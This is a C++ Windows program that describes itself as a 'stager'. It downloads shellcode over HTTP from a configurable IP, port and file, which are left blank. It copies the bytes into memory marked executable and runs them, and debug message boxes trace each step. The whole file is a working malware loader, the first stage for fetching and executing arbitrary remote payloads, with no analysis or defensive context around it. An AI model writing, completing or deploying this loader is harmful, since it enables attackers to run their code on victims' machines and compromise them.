#include <windows.h>
#include <wininet.h>
#include <cstdio>
#pragma comment(lib, "wininet.lib")

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    MessageBoxA(NULL, "Stager Started", "Debug", MB_OK);
    
    const char* ip = "";
    const char* port = "";
    const char* file = "";
    
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%s/%s", ip, port, file);
    
    MessageBoxA(NULL, url, "Downloading from", MB_OK);
    
    // Download
    HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if(!hNet) {
        MessageBoxA(NULL, "InternetOpen failed", "Error", MB_OK);
        return 0;
    }
    
    HINTERNET hUrl = InternetOpenUrlA(hNet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if(!hUrl) {
        MessageBoxA(NULL, "InternetOpenUrl failed", "Error", MB_OK);
        InternetCloseHandle(hNet);
        return 0;
    }
    
    MessageBoxA(NULL, "Connected, reading shellcode", "Debug", MB_OK);
    
    unsigned char* buffer = (unsigned char*)VirtualAlloc(NULL, 409600, MEM_COMMIT, PAGE_READWRITE);
    DWORD bytesRead = 0, totalRead = 0;
    
    while(InternetReadFile(hUrl, buffer + totalRead, 4096, &bytesRead) && bytesRead > 0) {
        totalRead += bytesRead;
    }
    
    char msg[256];
    snprintf(msg, sizeof(msg), "Downloaded %d bytes", totalRead);
    MessageBoxA(NULL, msg, "Success", MB_OK);
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hNet);
    
    if(totalRead > 0) {
        // Execute shellcode
        LPVOID execMem = VirtualAlloc(NULL, totalRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if(execMem) {
            memcpy(execMem, buffer, totalRead);
            MessageBoxA(NULL, "Executing shellcode", "Debug", MB_OK);
            ((void(*)())execMem)();
        }
    }
    
    VirtualFree(buffer, 0, MEM_RELEASE);
    return 0;
}
EOF
